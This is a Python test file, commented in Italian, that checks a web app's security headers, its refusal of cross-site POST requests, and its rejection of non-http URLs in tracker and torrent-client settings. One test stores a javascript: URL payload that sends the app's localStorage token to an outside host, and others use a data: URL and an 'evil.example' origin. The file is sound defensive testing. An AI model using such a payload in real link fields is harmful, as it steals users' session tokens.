"""Protezioni HTTP comuni (app/security_headers.py)."""


def test_every_response_has_the_security_headers(client):
    response = client.get("/api/disks")
    assert response.headers["X-Frame-Options"] == "DENY"
    assert response.headers["X-Content-Type-Options"] == "nosniff"
    assert "frame-ancestors 'none'" in response.headers["Content-Security-Policy"]
    assert "script-src 'self'" in response.headers["Content-Security-Policy"]


def test_a_change_from_another_site_is_refused(client):
    # Anche con un token valido: difesa in profondità contro il CSRF.
    assert client.post("/api/reviews/1/approve", headers={"Sec-Fetch-Site": "cross-site"}).status_code == 403
    assert client.post("/api/reviews/1/approve", headers={"Origin": "https://evil.example"}).status_code == 403
    assert client.post("/api/reviews/1/approve", headers={"Origin": "null"}).status_code == 403
    # Dalla UI stessa, o da uno script senza Origin: passa (qui 404, la review non esiste).
    assert client.post("/api/reviews/1/approve", headers={"Sec-Fetch-Site": "same-origin"}).status_code == 404
    assert client.post("/api/reviews/1/approve", headers={"Origin": "http://testserver"}).status_code == 404
    assert client.post("/api/reviews/1/approve").status_code == 404
    # Le letture non si toccano.
    assert client.get("/api/disks", headers={"Sec-Fetch-Site": "cross-site"}).status_code == 200


def test_urls_that_end_up_in_links_must_be_http(client):
    evil = "javascript:fetch('//x/'+localStorage.nazgarr_token)//"
    tracker = {"label": "t", "adapter_type": "unit3d", "base_url": evil, "api_token": "x"}
    assert client.post("/api/trackers", json=tracker).status_code == 422
    ok = client.post("/api/trackers", json={**tracker, "base_url": "https://t.example"})
    assert ok.status_code == 201
    tracker_id = ok.json()["id"]
    assert client.patch(f"/api/trackers/{tracker_id}", json={"base_url": "data:text/html,x"}).status_code == 422
    assert client.patch(f"/api/trackers/{tracker_id}", json={"announce_url": evil}).status_code == 422
    client_body = {"label": "q", "adapter_type": "qbittorrent", "base_url": evil}
    assert client.post("/api/torrent-clients", json=client_body).status_code == 422
